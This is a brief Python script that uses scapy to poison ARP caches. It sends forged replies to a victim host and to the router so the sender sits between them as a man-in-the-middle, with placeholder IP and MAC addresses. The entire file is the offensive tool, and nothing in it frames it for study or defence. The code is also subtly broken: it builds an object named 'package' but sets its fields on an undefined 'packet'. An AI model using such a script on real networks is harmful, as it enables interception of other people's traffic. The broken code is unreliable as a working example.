#!/usr/bin/env python3

import scapy.all as scapy


# Gloabal Variables
##############################################################################
TARGET_IP = "10.0.2.15"                           # Target Ip Address
TARGET_MAC_ADDR = "aa:bb:cc:dd:ee:ff"             # Target MAC Address
ROUTER_IP = "10.0.2.1"                            # Router Ip Address
ROUTER_MAC_ADDR = "11:22:33:44:55:66"             # Router MAC Address
OPERATION = 2                                     # Arp Response Package
##############################################################################


def spoof_arp(target_ip, target_mac, spoofed_ip):
    package = scapy.ARP()                         # ARP Package Generated
    packet.op = OPERATION                         # Set Operation to Response
    packet.pdst = target_ip                       # Set Target Ip Address
    packet.hwdst = target_mac                     # Set Target MAC Address
    packet.psrc = spoofed_ip                      # Set Router Ip Address 
    scapy.send(package)                           # Send the Package


def main():
    # Send Packet to the Victim to Say I am the Router
    spoof_arp(TARGET_IP,TARGET_MAC_ADDR,ROUTER_IP)

    # Send Packet to the Router to Say I am the Victim
    spoof_arp(ROUTER_IP,ROUTER_MAC_ADDR,TARGET_IP)


if __name__ == '__main__':
    main()